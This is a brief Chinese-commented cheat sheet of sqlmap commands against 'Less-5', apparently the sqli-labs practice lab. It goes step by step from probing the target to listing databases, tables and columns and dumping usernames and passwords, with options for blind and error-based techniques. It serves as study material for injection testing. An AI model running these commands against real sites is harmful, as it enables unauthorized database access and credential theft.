

```sh
#基础探测
sqlmap -u "http://xxx/Less-5/?id=1" --batch
	--batch: 自动选“是”，不再一遍遍问你 [Y/n]
	--指定参数就行,会告诉你 id 参数存在多种注入方式
	
#爆数据库名
sqlmap -u "http://xxx/Less-5/?id=1" --dbs

#爆表名
sqlmap -u "http://xxx/Less-5/?id=1" -D security --tables	#假设库名:security

#爆列名
sqlmap -u "http://xxx/Less-5/?id=1" -D security -T users --columns	#假设表名: users

#拖取数据
sqlmap -u "http://xxx/Less-5/?id=1" -D security -T users -C "username,password" --dump
==================================
#示例
#1.爆库名
sqlmap -u "http://xx.xx?id=1" --batch --dbs --technique E
#2.爆表
sqlmap -u "http://xx.xx?id=1" -D security --tables
#3.爆列名
sqlmap -u "http://xxx/Less-5/?id=1" -D security -T users --columns
#3.爆字段
sqlmap -u "http://xxx/Less-5/?id=1" -D security -T users -C "username,password" --dump

==================================
#其他
--flush-session	#刷新,不记录缓存
--technique E	#指定报错注入
--technique B	#指定布尔盲注
--technique T	#时间盲注
--dbms=mysql	#指定数据库 (减少探测时间)

--cookie "uname=admin;passwd=admin"		#使用cookie
--random-agent	#使用随机浏览器UA

```

